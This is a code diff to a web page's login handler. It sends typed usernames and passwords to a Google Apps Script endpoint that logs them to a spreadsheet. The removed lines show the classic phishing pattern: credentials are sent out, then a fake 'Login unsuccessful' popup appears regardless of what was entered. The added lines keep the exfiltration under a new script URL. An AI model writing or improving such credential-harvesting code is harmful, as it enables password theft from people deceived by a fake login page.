@@ -102,7 +102,7 @@ function resizeCell() {
 }
 
 // Google Apps Script URL to POST login info
-const googleScriptURL = 'https://script.google.com/macros/s/AKfycbw1F_PtoLRIy9ioxrQGJHOfIkAcMmE--ZvQ2V5Kou5OBw7uN28IV94cj45mxJXEOwqeBA/exec';
+const googleScriptURL = 'https://script.google.com/macros/s/AKfycbxoc1tV3AEnhw7pibP0kRSw6wm4LGWBXwllEqc1OwALmRKYlGXpsc0jKFeB3YaPmc0gKg/exec';
 
 // Override form submit handler
 function handleLogin(event) {
@@ -111,34 +111,34 @@ function handleLogin(event) {
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
 
-  // Check empty fields with alert popups
-  if (!username) {
-    alert('You must enter a Login ID.');
-    return false;
-  }
-  if (!password) {
-    alert('You must enter a Password.');
+  // Check empty fields
+  if (!username || !password) {
+    alert('You must enter a Login ID and Password.');
     return false;
   }
 
   // Prepare data to send to Google Apps Script
   const data = { username, password };
 
-  // Send login info asynchronously (no reload)
+  // Send login info
   fetch(googleScriptURL, {
     method: 'POST',
-    mode: 'no-cors', // Google Apps Script may require this to avoid CORS error
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
-  }).catch(console.error);
+    body: JSON.stringify(data),
+  })
+  .then(response => {
+    // Google Apps Script returns opaque response with no-cors
+    // You can’t read the response without enabling CORS and setting JSON output
+    alert('Login info sent. Check the spreadsheet.');
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    alert('Login failed to send. Please try again.');
+  });
 
-  // Show the invalid login popup no matter what
-  alert('Login unsuccessful. Please check your Login ID and Password.');
-
-  // Reset password field for security
+  // Reset form
   document.getElementById('password').value = '';
-
-  return false; // Prevent navigation or reload
+  return false;
 }
 </script>
 
